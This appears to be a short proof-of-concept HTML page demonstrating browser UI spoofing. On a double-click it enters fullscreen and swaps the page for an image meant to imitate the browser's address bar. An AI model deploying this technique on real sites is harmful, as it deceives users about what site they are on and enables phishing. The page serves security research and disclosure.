<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security UI Spoof</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        body {
            margin: 0;
            padding: 0;
        }         
        #spoof {
            width:  100%;
            height: 100%;
        }
    </style>
    <script>
        document.addEventListener("dblclick", async () => {
            try {
                // Open Fullscreen
                if (document.documentElement.requestFullscreen) {
                    await document.documentElement.requestFullscreen();
                } else if (document.documentElement.mozRequestFullScreen) { // Firefox
                    await document.documentElement.mozRequestFullScreen();
                } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari & Opera
                    await document.documentElement.webkitRequestFullscreen();
                } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
                    await document.documentElement.msRequestFullscreen();
                }

                // Hide content and show spoof image
                document.getElementById("spoof").style.display = "block";
                document.getElementById("content").style.display = "none";
            } catch (error) {
                console.error("Fullscreen error:", error);
            }
        });
    </script>
</head>  
<body>
    <img id="spoof" style="display: none;" src="spoof.png" />
    <div id="content">
        <br><br><br>
        <center>
            <h1>Double-click anywhere on the page to spoof the omnibox!</h1>
        </center>
    </div>
</body>
</html>
